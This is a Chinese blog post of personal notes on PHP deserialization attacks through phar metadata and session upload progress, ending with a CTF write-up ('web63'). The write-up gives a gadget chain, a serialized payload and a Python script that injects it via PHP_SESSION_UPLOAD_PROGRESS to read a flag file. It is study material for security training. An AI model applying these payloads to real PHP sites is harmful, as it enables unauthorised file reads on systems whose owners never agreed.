<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>【心得】PHP反序列化高级利用(phar|session)个人笔记 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="【心得】PHP反序列化高级利用(phar|session)个人笔记" />
<meta property="og:description" content="目录
①phar反序列化
②session反序列化
①phar反序列化 phar 认为是java的jar包 calc.exe
phar能干什么
多个php合并为独立压缩包，不解压就能执行里面的php文件，支持web服务器和命令行
phar协议
phar://xxx.phar
$phar-&gt;setmetadata($h);
metaData可以存放一个类实例，会将这个类实例以序列化字符串形式存放至Phar文件内
当使用phar协议加载phar文件时，会自动反序列化这个类的序列化字符串
总结：
1.生成phar包时，可以往metaData里面放对象
2.生成后，对象会自动序列化保存到phar包中
3.使用phar协议读取phar包时，如果当前脚本识别了这个类，会自动调用这个类的魔术方法
哪里使用的多
如果有上传点，上传文件的前半部分可控，后缀黑名单，不能上传危险的后缀为php phps phtml ini 没有禁止上传phar文件
能够上传phar文件，找到大量使用的file_exists等文件读取函数，通过控制phar://头，来使用phar协议来解析phar包
就能自动进行反序列化
条件：
1 能够生成phar包并上传写入
2 有可利用的文件操作函数，并控制了协议头，使用phar协议解析
3 有可利用的恶意类
可以触发phar反序列化的函数
fopen() unlink() stat() fstat() fseek() rename() opendir() rmdir() mkdir() file_put_contents() file_get_contents() file_exists() fileinode() include() require() include_once require_once() filemtime() fileowner() fileperms() filesize() is_dir() scandir() rmdir() highlight_file()
②session反序列化 在 PHP 中，PHP_SESSION_UPLOAD_PROGRESS是一个内置的会话变量，用于跟踪文件上传的进度。当使用 PHP 通过 HTTP POST 方法上传文件时，PHP 将自动创建并初始化这个变量。它的值表示上传文件的字节数。这个值可能会在整个上传过程中不断更新，以反映上传的实时进度。在一些情况下，可以使用这个变量来实现对上传进度的监控和处理。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/39446aa6dd19516d7c5c66ecf1a35247/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-01-01T22:51:22+08:00" />
<meta property="article:modified_time" content="2024-01-01T22:51:22+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">【心得】PHP反序列化高级利用(phar|session)个人笔记</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p id="main-toc"><strong>目录</strong></p> 
<p id="%E2%91%A0phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-toc" style="margin-left:0px;"><a href="#%E2%91%A0phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" rel="nofollow">①phar反序列化</a></p> 
<p id="%E2%91%A1session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-toc" style="margin-left:0px;"><a href="#%E2%91%A1session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" rel="nofollow">②session反序列化</a></p> 
<hr id="hr-toc"> 
<p></p> 
<h2 id="%E2%91%A0phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">①phar反序列化</h2> 
<p>phar 认为是java的jar包   calc.exe</p> 
<p>phar能干什么</p> 
<p>多个php合并为独立压缩包，不解压就能执行里面的php文件，支持web服务器和命令行</p> 
<p>phar协议</p> 
<p>phar://xxx.phar<br> $phar-&gt;setmetadata($h);<br> metaData可以存放一个类实例，会将这个类实例以序列化字符串形式存放至Phar文件内<br> 当使用phar协议加载phar文件时，会自动反序列化这个类的序列化字符串<br> 总结：<br> 1.生成phar包时，可以往metaData里面放对象<br> 2.生成后，对象会自动序列化保存到phar包中<br> 3.使用phar协议读取phar包时，如果当前脚本识别了这个类，会自动调用这个类的魔术方法</p> 
<p>哪里使用的多</p> 
<p>如果有上传点，上传文件的前半部分可控，后缀黑名单，不能上传危险的后缀为php phps phtml ini 没有禁止上传phar文件<br> 能够上传phar文件，找到大量使用的file_exists等文件读取函数，通过控制phar://头，来使用phar协议来解析phar包<br> 就能自动进行反序列化</p> 
<p>条件：<br> 1 能够生成phar包并上传写入<br> 2 有可利用的文件操作函数，并控制了协议头，使用phar协议解析<br> 3 有可利用的恶意类</p> 
<p><br> 可以触发phar反序列化的函数<br> fopen() unlink() stat() fstat() fseek() rename() opendir() rmdir() mkdir() file_put_contents() file_get_contents() <br> file_exists() fileinode() include() require() include_once require_once() filemtime() fileowner() fileperms() <br> filesize() is_dir() scandir() rmdir() highlight_file()</p> 
<p></p> 
<h2 id="%E2%91%A1session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">②session反序列化</h2> 
<p>在 PHP 中，PHP_SESSION_UPLOAD_PROGRESS是一个内置的会话变量，用于跟踪文件上传的进度。当使用 PHP 通过 HTTP POST 方法上传文件时，PHP 将自动创建并初始化这个变量。它的值表示上传文件的字节数。这个值可能会在整个上传过程中不断更新，以反映上传的实时进度。在一些情况下，可以使用这个变量来实现对上传进度的监控和处理。</p> 
<p>php的session时存放在文件中的 默认位置时/tmp/sess_PHPSESSID<br> session 可以放字符串，数字，也可以放对象</p> 
<p>1 session里面存放对象时，会自动进行序列化，存放序列化后的字符串<br> 2  session里面拿取对象时，会自动进行反序列化，执行对象的魔术方法</p> 
<p>php序列化处理器方式<br> xxx|O:4:"user":2{s:8"username";N;s:8:"password";N;}<br> php_serialize序列化处理器方式<br> a:1:{s:3:"xxx";O:4:"user":2:{s:8"username";N;s:8:"password";N;}}</p> 
<p>例题：web63</p> 
<p><img alt="" height="423" src="https://images2.imgbox.com/4c/8e/7bHWhucP_o.png" width="386"></p> 
<p>?phpinfo=看一眼phpinfo，应证了<code>ini_set("session.serialize_handler", "php");</code></p> 
<p>即用'|'识别，竖线以左代表session的key（键），竖线以右代表反序列化的字符串</p> 
<p><img alt="" height="835" src="https://images2.imgbox.com/98/c1/ASAP2mng_o.png" width="1200"></p> 
<p>?source=看一眼class.php </p> 
<p>贴出源码</p> 
<pre><code>&lt;?php
    class Happy {
        public $happy;
        function __construct(){
                $this-&gt;happy="Happy_New_Year!!!";

        }
        function __destruct(){
                $this-&gt;happy-&gt;happy;

        }
        public function __call($funName, $arguments){
                die($this-&gt;happy-&gt;$funName);
        }

        public function __set($key,$value)
        {
            $this-&gt;happy-&gt;$key = $value;
        }
        public function __invoke()
        {
            echo $this-&gt;happy;
        }


    }

    class _New_{
        public $daniu;
        public $robot;
        public $notrobot;
        private $_New_;
        function __construct(){
                $this-&gt;daniu="I'm daniu.";
                $this-&gt;robot="I'm robot.";
                $this-&gt;notrobot="I'm not a robot.";

        }
        public function __call($funName, $arguments){
                echo $this-&gt;daniu.$funName."not exists!!!";
        }

        public function __invoke()
        {
            echo $this-&gt;daniu;
            $this-&gt;daniu=$this-&gt;robot;
            echo $this-&gt;daniu;
        }
        public function __toString()
        {
            $robot=$this-&gt;robot;
            $this-&gt;daniu-&gt;$robot=$this-&gt;notrobot;
            return (string)$this-&gt;daniu;

        }
        public function __get($key){
               echo $this-&gt;daniu.$key."not exists!!!";
        }

 }
    class Year{
        public $zodiac;
         public function __invoke()
        {
            echo "happy ".$this-&gt;zodiac." year!";

        }
         function __construct(){
                $this-&gt;zodiac="Hu";
        }
        public function __toString()
        {
                $this-&gt;show();

        }
        public function __set($key,$value)#3
        {
            $this-&gt;$key = $value;
        }

        public function show(){
            die(file_get_contents($this-&gt;zodiac));
        }
        public function __wakeup()
        {
            $this-&gt;zodiac = 'hu';
        }

    }
?&gt;</code></pre> 
<p>先搓个链子</p> 
<pre><code class="hljs">Happy::__destruct-&gt;_New_::__get-&gt;_New_::__toString-&gt;Year::__toString-&gt;Year::show</code></pre> 
<p> 构造</p> 
<pre><code class="hljs">$h=new Happy();
$n=new _New_();
$n2=new _New_();
$y=new Year();
$n2-&gt;daniu=$y;
$n2-&gt;robot='zodiac';
$n2-&gt;notrobot='/f1ag';
$n-&gt;daniu=$n2;
$h-&gt;happy=$n;

echo serialize($h);

//O:5:"Happy":1:{s:5:"happy";O:5:"_New_":4:{s:5:"daniu";O:5:"_New_":4:{s:5:"daniu";O:4:"Year":1:{s:6:"zodiac";s:2:"Hu";}s:5:"robot";s:6:"zodiac";s:8:"notrobot";s:5:"/f1ag";s:12:" _New_ _New_";N;}s:5:"robot";s:10:"I'm robot.";s:8:"notrobot";s:16:"I'm not a robot.";s:12:" _New_ _New_";N;}}</code></pre> 
<p>因为class.php的类都在初始界面注册，我们通过强制文件上传的形式，把filename存到session中，在session_start()触发反序列化，利用恶意类进行任意文件读取。</p> 
<p>写个表单提交脚本</p> 
<pre><code class="hljs">import  requests

p1='''a|O:5:\"Happy\":1:{s:5:\"happy\";O:5:\"_New_\":4:{s:5:\"daniu\";O:5:\"_New_\":4:{s:5:\"daniu\";O:4:\"Year\":1:{s:6:\"zodiac\";s:2:\"Hu\";}s:5:\"robot\";s:6:\"zodiac\";s:8:\"notrobot\";s:5:\"/f1ag\";s:12:\" _New_ _New_\";N;}s:5:\"robot\";s:10:\"I'm robot.\";s:8:\"notrobot\";s:16:\"I'm not a robot.\";s:12:\" _New_ _New_\";N;}}'''
url='http://edb45d1d-7acd-41da-8f1f-00b7b898cc21.challenges.ctfer.com:8080/'
session=requests.session()

file={'file':(p1,'aaa')}

data={"PHP_SESSION_UPLOAD_PROGRESS":123}

cookie={'PHPSESSID':'441a16842171ded17f387411ab56a85f'}

resp=session.post(url=url,data=data,files=file,cookies=cookie,proxies={'http':'127.0.0.1:8080'})
print(resp.text)</code></pre> 
<p> <img alt="" height="501" src="https://images2.imgbox.com/05/1b/YBuKxn1l_o.png" width="1200"></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/c9f372e316a6c089249d3e712dfb00ef/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">5个用于构建Web应用程序的Go Web框架</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/37b7b6be347137c67b7a83636f1f6f50/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">docker中部署websocket客户端无法连接的坑</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>